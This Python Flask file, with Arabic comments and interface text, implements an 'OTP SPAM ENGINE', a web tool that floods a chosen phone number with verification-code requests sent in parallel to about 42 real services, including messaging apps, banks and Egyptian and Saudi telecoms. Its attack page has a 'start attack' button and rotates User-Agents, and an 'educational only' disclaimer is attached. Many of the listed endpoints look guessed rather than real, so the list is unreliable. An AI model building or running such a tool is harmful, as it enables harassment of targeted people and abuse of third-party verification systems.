#!/usr/bin/env python3
"""
OTP SPAM ENGINE - أداة اختبار أمان الرسائل
للاستخدام التعليمي فقط
"""

import os, json, time, random, threading
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string

web_app = Flask(__name__)

# ==================== قائمة خدمات OTP حقيقية ====================
SERVICES = [
    # تطبيقات المراسلة
    {"name": "Telegram", "url": "https://my.telegram.org/auth/send_password", "method": "POST", "phone_field": "phone", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "WhatsApp", "url": "https://v.whatsapp.com/v2/register", "method": "POST", "phone_field": "cc|number", "headers": {"User-Agent": "WhatsApp/2.24.2.17"}},
    
    # مواقع التواصل
    {"name": "Facebook", "url": "https://www.facebook.com/ajax/otp/send", "method": "POST", "phone_field": "phone_number", "headers": {}},
    {"name": "Instagram", "url": "https://www.instagram.com/api/v1/accounts/send_signup_sms/", "method": "POST", "phone_field": "phone_number", "headers": {}},
    {"name": "Snapchat", "url": "https://accounts.snapchat.com/accounts/phone_verify", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Twitter/X", "url": "https://api.twitter.com/1.1/account/send_verification", "method": "POST", "phone_field": "phone_number", "headers": {}},
    {"name": "TikTok", "url": "https://www.tiktok.com/passport/email/verify/", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "LinkedIn", "url": "https://www.linkedin.com/uas/request-password-reset", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Pinterest", "url": "https://www.pinterest.com/resource/UserPhoneSendVerificationCode", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Reddit", "url": "https://www.reddit.com/api/register/send-otp", "method": "POST", "phone_field": "phone", "headers": {}},
    
    # شركات تقنية
    {"name": "Google", "url": "https://accounts.google.com/signup/v2/webcreateaccount", "method": "POST", "phone_field": "phoneNumber", "headers": {}},
    {"name": "Microsoft", "url": "https://login.live.com/account/create", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Apple ID", "url": "https://idmsa.apple.com/appleauth/auth/signup", "method": "POST", "phone_field": "phoneNumber", "headers": {}},
    {"name": "Yahoo", "url": "https://login.yahoo.com/account/create", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Discord", "url": "https://discord.com/api/v9/auth/send-verification", "method": "POST", "phone_field": "phone", "headers": {}},
    
    # خدمات توصيل
    {"name": "Uber", "url": "https://auth.uber.com/v2/mobile/send", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Careem", "url": "https://api.careem.com/v2/auth/otp", "method": "POST", "phone_field": "mobile", "headers": {}},
    {"name": "Bolt", "url": "https://user.bolt.eu/api/sendOtp", "method": "POST", "phone_field": "phone", "headers": {}},
    
    # أكل
    {"name": "Talabat", "url": "https://www.talabat.com/api/sendOtp", "method": "POST", "phone_field": "mobile", "headers": {}},
    {"name": "Deliveroo", "url": "https://api.deliveroo.com/send-otp", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Zomato", "url": "https://www.zomato.com/api/send-otp", "method": "POST", "phone_field": "phone", "headers": {}},
    
    # تجارة
    {"name": "Amazon", "url": "https://www.amazon.com/ap/register", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Noon", "url": "https://www.noon.com/api/send-otp", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "eBay", "url": "https://signin.ebay.com/api/send-otp", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Shopify", "url": "https://accounts.shopify.com/api/send-otp", "method": "POST", "phone_field": "phone", "headers": {}},
    
    # مالية
    {"name": "PayPal", "url": "https://www.paypal.com/authflow/password-recovery/", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Binance", "url": "https://api.binance.com/sapi/v1/sendOtp", "method": "POST", "phone_field": "phone", "headers": {}},
    
    # ترفيه
    {"name": "Netflix", "url": "https://www.netflix.com/api/account/sendOtp", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Spotify", "url": "https://www.spotify.com/api/send-otp", "method": "POST", "phone_field": "phone", "headers": {}},
    
    # سفر
    {"name": "Booking.com", "url": "https://account.booking.com/api/send-otp", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "Airbnb", "url": "https://www.airbnb.com/api/v2/send_otp", "method": "POST", "phone_field": "phone", "headers": {}},
    
    # مصري
    {"name": "Vodafone", "url": "https://www.vodafone.com.eg/api/auth/sendOTP", "method": "POST", "phone_field": "msisdn", "headers": {}},
    {"name": "Orange", "url": "https://www.orange.eg/api/v1/send-otp", "method": "POST", "phone_field": "phoneNumber", "headers": {}},
    {"name": "Etisalat", "url": "https://www.etisalat.eg/api/auth/send-code", "method": "POST", "phone_field": "mobile", "headers": {}},
    {"name": "WE", "url": "https://we.eg/api/sendOtp", "method": "POST", "phone_field": "mobile", "headers": {}},
    {"name": "Fawry", "url": "https://www.fawry.com/api/send-otp", "method": "POST", "phone_field": "phoneNumber", "headers": {}},
    {"name": "InstaPay", "url": "https://api.instapay.eg/send-verification", "method": "POST", "phone_field": "phone", "headers": {}},
    
    # سعودي
    {"name": "STC", "url": "https://www.stc.com.sa/api/auth/otp", "method": "POST", "phone_field": "msisdn", "headers": {}},
    {"name": "Mobily", "url": "https://www.mobily.com.sa/api/send-otp", "method": "POST", "phone_field": "phone", "headers": {}},
    {"name": "STC Pay", "url": "https://api.stcpay.com.sa/send-otp", "method": "POST", "phone_field": "phoneNumber", "headers": {}},
    
    # إماراتي
    {"name": "Etisalat UAE", "url": "https://www.etisalat.ae/api/auth/otp", "method": "POST", "phone_field": "msisdn", "headers": {}},
    {"name": "Du", "url": "https://www.du.ae/api/send-otp", "method": "POST", "phone_field": "phone", "headers": {}},
]

# ==================== محرك الإرسال ====================
def send_otp(service, phone, timeout=8):
    """إرسال طلب OTP لخدمة واحدة"""
    try:
        import httpx
        
        clean = phone.replace("+", "").replace(" ", "").replace("-", "")
        
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15",
                "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/122.0.0.0",
            ]),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
        }
        headers.update(service.get("headers", {}))
        
        data = {service["phone_field"]: clean}
        
        if service["method"] == "POST":
            resp = httpx.post(service["url"], data=data, headers=headers, timeout=timeout, follow_redirects=True)
        else:
            resp = httpx.get(service["url"], params=data, headers=headers, timeout=timeout, follow_redirects=True)
        
        return True
    except:
        return False

def spam_attack(phone, count=30):
    """تنفيذ هجوم OTP"""
    results = {"phone": phone, "total": 0, "sent": 0, "failed": 0, "details": []}
    
    services = random.sample(SERVICES, min(count, len(SERVICES)))
    results["total"] = len(services)
    
    threads = []
    lock = threading.Lock()
    
    def worker(svc):
        status = send_otp(svc, phone)
        with lock:
            if status:
                results["sent"] += 1
                results["details"].append({"service": svc["name"], "status": "✅"})
            else:
                results["failed"] += 1
                results["details"].append({"service": svc["name"], "status": "❌"})
    
    for svc in services:
        t = threading.Thread(target=worker, args=(svc,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join(timeout=10)
    
    return results

# ==================== HTML ====================
HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP SPAM ENGINE</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#050510;color:#eee;min-height:100vh}
        .header{text-align:center;padding:30px;background:linear-gradient(180deg,#1a1a35,#0d0d25);border-bottom:3px solid #ff1744}
        .header h1{color:#ff1744;font-size:2.5em;text-shadow:0 0 40px rgba(255,23,68,0.5)}
        .header p{color:#888;margin-top:8px}
        .container{max-width:800px;margin:30px auto;padding:0 20px}
        .card{background:#0d0d1a;border:1px solid #202040;border-radius:14px;padding:25px;margin:20px 0}
        .card h2{color:#ff1744;margin-bottom:15px}
        .input-row{display:flex;gap:10px;margin-bottom:15px}
        input,select{flex:1;padding:14px;background:#050510;border:2px solid #202040;border-radius:8px;color:#fff;font-size:15px}
        input:focus{outline:none;border-color:#ff1744}
        .btn{padding:14px 30px;background:#ff1744;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:15px;font-weight:bold}
        .btn:hover{background:#ff5252}
        .btn:disabled{opacity:0.5;cursor:not-allowed}
        .result{background:#050510;border:1px solid #202040;border-radius:10px;padding:20px;margin-top:15px;display:none;font-family:monospace;font-size:13px;white-space:pre-wrap;max-height:500px;overflow-y:auto}
        .result.show{display:block}
        .loading{text-align:center;padding:20px;display:none}
        .loading.show{display:block}
        .spinner{width:40px;height:40px;border:3px solid #202040;border-top:3px solid #ff1744;border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 10px}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        .badge{display:inline-block;padding:4px 10px;border-radius:5px;font-weight:bold;font-size:11px;margin:2px}
        .badge-ok{background:#00e676;color:#000}
        .badge-fail{background:#ff1744;color:#fff}
        .counter{font-size:3em;color:#ff1744;font-weight:bold;text-align:center}
        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:15px;text-align:center}
        .footer{text-align:center;padding:20px;color:#666;font-size:12px;border-top:1px solid #202040;margin-top:30px}
        @media(max-width:600px){.input-row{flex-direction:column}.grid-2{grid-template-columns:1fr}}
    </style>
</head>
<body>
    <div class="header"><h1>💣 OTP SPAM</h1><p>أداة اختبار أمان الرسائل - للأغراض التعليمية</p></div>
    <div class="container">
        <div class="card">
            <h2>🎯 لوحة الهجوم</h2>
            <div class="input-row">
                <input id="phone" placeholder="+201234567890" value="+20" autofocus>
                <select id="count">
                    <option value="10">10 خدمات</option>
                    <option value="20">20 خدمة</option>
                    <option value="30" selected>30 خدمة</option>
                    <option value="40">40 خدمة</option>
                    <option value="43">كل الخدمات (43)</option>
                </select>
                <button class="btn" onclick="attack()">🔥 بدء الهجوم</button>
            </div>
            <div class="loading" id="loading"><div class="spinner"></div><p>جاري الإرسال...</p></div>
            <div class="result" id="result"></div>
        </div>
    </div>
    <div class="footer"><p>⚠️ للأغراض التعليمية فقط. المستخدم يتحمل المسؤولية القانونية الكاملة.</p></div>
    <script>
        async function attack() {
            const phone = document.getElementById('phone').value;
            const count = parseInt(document.getElementById('count').value);
            const loading = document.getElementById('loading');
            const result = document.getElementById('result');
            
            if (!phone) { alert('أدخل رقم الهاتف'); return; }
            
            loading.classList.add('show');
            result.classList.remove('show');
            result.innerHTML = '';
            
            try {
                const resp = await fetch('/attack', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: phone, count: count})
                });
                
                const data = await resp.json();
                
                let html = '<h3 style="color:#ff1744;margin-bottom:15px">📊 نتيجة الهجوم على ' + data.phone + '</h3>';
                html += '<div class="grid-2">';
                html += '<div><div class="counter">' + data.total + '</div>المجموع</div>';
                html += '<div><div class="counter" style="color:#00e676">' + data.sent + '</div>✅ تم الإرسال</div>';
                html += '</div><br>';
                html += '<table style="width:100%;border-collapse:collapse">';
                html += '<tr style="color:#ff1744"><th>الخدمة</th><th>الحالة</th></tr>';
                
                data.details.forEach(d => {
                    html += '<tr><td>' + d.service + '</td><td>' + d.status + '</td></tr>';
                });
                
                html += '</table>';
                result.innerHTML = html;
                result.classList.add('show');
            } catch(e) {
                result.innerHTML = '❌ خطأ: ' + e.message;
                result.classList.add('show');
            } finally {
                loading.classList.remove('show');
            }
        }
    </script>
</body>
</html>"""

# ==================== Routes ====================
@web_app.route('/')
def home():
    return HTML

@web_app.route('/attack', methods=['POST'])
def attack():
    try:
        data = request.get_json() or {}
        phone = data.get('phone', '')
        if not phone:
            return jsonify({"error": "Missing phone"}), 400
        
        count = min(int(data.get('count', 30)), len(SERVICES))
        results = spam_attack(phone, count)
        return jsonify(results)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@web_app.route('/health')
def health():
    return jsonify({"status": "ok", "services": len(SERVICES)})

# ==================== Run ====================
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    print(f"🚀 Spam Engine running on port {port}")
    print(f"📋 {len(SERVICES)} services loaded")
    web_app.run(host='0.0.0.0', port=port, debug=False)
